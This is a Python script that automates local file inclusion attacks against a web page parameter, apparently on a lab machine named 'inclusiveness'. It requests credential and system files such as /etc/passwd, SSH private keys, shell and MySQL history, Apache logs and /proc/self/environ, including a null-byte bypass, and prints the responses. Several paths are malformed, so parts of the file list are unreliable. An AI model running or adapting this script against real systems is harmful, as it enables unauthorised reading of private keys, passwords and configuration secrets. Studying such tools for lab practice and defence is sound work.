#!/usr/bin/python3


import os,sys,requests


url = "http://inclusiveness/secret_information/?lang=" # Include the URL of the suspected LFI page up to the equals sign.
home = "/home/tom" # You may need to request /etc/passwd to find potential home directories.
files = [
    "/etc/mtab",
    "/etc/inetd.conf",
    "/var/log/dmessage",
    ".htaccess",
    "config.php",
    "../.htaccess",
    "../config.php",
    "/etc/passwd",
    "/etc/passwd%00", # If webapp places a file extension on the requested doc, use a null-byte to disregard.
    home+"/.ssh/authorized_keys",
    home+"/.ssh/id_rsa",
    home+"/.ssh/id_rsa.keystore",
    home+"/.ssh/id_rsa.pub",
    home+"/.ssh/known_hosts",
    "/etc/httpd/logs/acces_log",
    "/etc/httpd/logs/error_log",
    "/var/www/logs/access_log",
    "/var/www/logs/access.log",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache/logs/access.log",
    "/var/log/apache/access_log",
    "/var/log/apache2/access_log",
    "/var/log/apache/access.log",
    "/var/log/apache2/access.log",
    "/var/log/access_log",
    home+".bash_history",
    home+".mysql_history",
    home+".my.cnf",
    "/proc/sched_debug", # Can be used to see what processes the machine is running
    "/proc/mounts",
    "/proc/net/arp",
    "/proc/net/route",
    "/proc/net/tcp",
    "/proc/net/udp",
    "/proc/net/fib_trie",
    "/proc/version",
    "/proc/self/environ"
]


def request():
    for file in files:
        r = requests.get(url+file)
        if int(r.status_code) == 200 and len(str(r.text)) > 150:
            print(r.text[142:]) # This is a lazy way to strip the headers and most of the page source to get the tasty meat inside the request.

request()
